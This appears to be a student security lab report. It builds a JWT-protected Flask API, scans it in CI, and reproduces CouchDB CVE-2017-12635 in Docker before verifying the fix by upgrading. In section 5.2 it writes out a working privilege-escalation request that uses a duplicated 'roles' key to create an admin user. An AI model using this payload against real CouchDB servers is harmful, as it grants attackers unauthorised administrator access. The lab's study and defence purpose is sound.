# 实验一：安全 REST API 与 CVE-2017-12635 复现

| 项目 | 内容 |
|---|---|
| 实验编号 | Work 1 |
| 变体 | CVE-2017-12635 |
| 姓名 | Guo Ruihao |
| HDU 学号 | 23320309 |
| 仓库 | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |
| 成功流水线 | <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176> |

## 1. 实验目的

用 Flask 实现一个需要 JWT 登录的 REST API，防止 SQL 注入和 XSS；用
GitHub Actions 运行 Bandit 和 pip-audit；用 Docker 复现
CVE-2017-12635 并验证修复。

## 2. 项目与 API

代码在 `app.py`，数据库用 SQLite。运行：

```powershell
cd "C:\Users\29611\Desktop\信息安全\lab\secure-api"
py -3 -m venv .venv
.\.venv\Scripts\python.exe -m pip install -r requirements.txt
.\.venv\Scripts\python.exe app.py
```

首次运行会创建两个测试用户：`alice / 123456`（admin）和
`bob / 123456`（user）。

| 方法 | 路径 | 说明 |
|---|---|---|
| POST | `/auth/login` | 登录，返回 JWT |
| GET | `/api/data` | 获取数据，需要 token |
| POST | `/api/data` | 新增数据，需要 token |

登录：

```bat
curl.exe -X POST http://127.0.0.1:5000/auth/login -H "Content-Type: application/json" -d "{\"login\":\"alice\",\"password\":\"123456\"}"
```

获取数据（把 `TOKEN` 换成登录返回的 token）：

```bat
curl.exe http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN"
```

不带 token 时返回 401。

新增数据：

```bat
curl.exe -X POST http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"title\":\"test\",\"body\":\"hello\"}"
```

## 3. 安全措施

- **SQL 注入**：所有 SQL 都用 `?` 占位符，例如
  `SELECT * FROM users WHERE username = ?`，不拼接用户输入。
- **XSS**：返回数据前用 `html.escape()` 转义标题、正文和用户名。
- **认证**：密码用 bcrypt 哈希后存储；登录返回 HS256 JWT；两个受保护
  接口都使用 `@login_required` 验证 token，缺失或无效时返回 401。

## 4. CI/CD

`.github/workflows/ci.yml` 在每次 push 时运行：

```text
python -c "import app"
bandit app.py
pip-audit -r requirements.txt
```

结果：Bandit 无问题，pip-audit 无已知漏洞。报告作为
`security-reports` artifact 上传。

流水线：<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176>

![SAST 和 SCA 结果](screenshots/security-check.png)

![GitHub Actions](screenshots/ci-success.png)

## 5. CVE-2017-12635

### 5.1 漏洞说明

CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。CouchDB 用 Erlang
解析器检查权限，用 JavaScript 解析器保存用户。请求中出现重复的 `roles`
键时，两个解析器看到的值不同，普通用户可以把自己创建成管理员。

### 5.2 复现

```bash
git clone --depth 1 https://github.com/vulhub/vulhub.git
cd vulhub/couchdb/CVE-2017-12635
docker compose up -d
```

如果返回 `404 Database does not exist`，手动创建系统库：

```bat
curl.exe -X PUT http://admin:password@127.0.0.1:5984/_users
curl.exe -X PUT http://admin:password@127.0.0.1:5984/_replicator
curl.exe -X PUT http://admin:password@127.0.0.1:5984/_global_changes
```

正常设置管理员角色，返回 403：

```bat
curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"password\":\"vulhub\"}"
```

使用重复 `roles`，返回 201：

```bat
curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
```

登录后可以看到 `_admin` 角色：

```bat
curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
```

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
```

![漏洞复现](screenshots/cve-before.png)

### 5.3 根因分析

这是两个 JSON 解析器对重复键的处理不一致。权限检查阶段读取第一个
`roles`（`["_admin"]`），保存阶段读取最后一个 `roles`（`[]`），导致
权限检查和实际保存的用户角色不一致。

### 5.4 修复

先停止漏洞环境：

```bash
docker compose down
```

使用 CouchDB 2.1.1：

```bash
docker run -d --name couchdb-fixed -p 5985:5984 -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password couchdb:2.1.1
```

等待几秒后创建系统库：

```bat
curl.exe -X PUT http://admin:password@127.0.0.1:5985/_users
```

修复方式是升级镜像版本，没有修改 Dockerfile 或 compose 文件，因此没有
额外的 fix 文件夹。

### 5.5 修复验证

重复 `roles` 请求仍返回 201，但登录后角色为空：

```bat
curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
```

```bat
curl.exe -u vulhub:vulhub http://127.0.0.1:5985/_session
```

```json
{"ok":true,"userCtx":{"name":"vulhub","roles":[]},...}
```

创建数据库返回 401：

```bat
curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5985/newdb
```

普通用户注册仍返回 201：

```bat
curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"normaluser\",\"roles\":[],\"password\":\"normalpass\"}"
```

![修复验证](screenshots/cve-after.png)
